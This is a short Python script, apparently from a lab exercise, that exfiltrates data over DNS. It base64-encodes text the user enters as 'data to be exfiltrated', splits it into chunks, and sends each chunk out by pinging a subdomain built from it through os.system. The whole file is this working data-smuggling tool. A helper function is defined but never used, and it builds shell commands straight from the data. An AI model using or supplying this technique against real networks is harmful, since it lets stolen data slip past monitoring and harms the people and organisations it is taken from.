import base64
import os

def split_base64_chunks(data, chunk_size=10):
    base64_data = base64.b64encode(data.encode()).decode('utf-8')
    chunks = [base64_data[i:i+chunk_size] for i in range(0, len(base64_data), chunk_size)]
    return chunks

def pad_chunk(chunk):
    padding_needed = len(chunk) % 4
    if padding_needed:
        chunk += "=" * (4 - padding_needed)
    return chunk

def send_chunks(chunks, domain):
    for chunk in chunks:
        chunk = chunk.replace("=", "-")  # Replace '=' with '-' for DNS query
        print(f"Sending chunk: {chunk}.{domain}")
        os.system(f"ping {chunk}.{domain}")

if __name__ == "__main__":
    data = input("Enter the data to be exfiltrated: ")
    domain = "lab17"
    chunks = split_base64_chunks(data)
    print("Chunks before padding:")
    for chunk in chunks:
        print(chunk)
    
    send_chunks(chunks, domain)
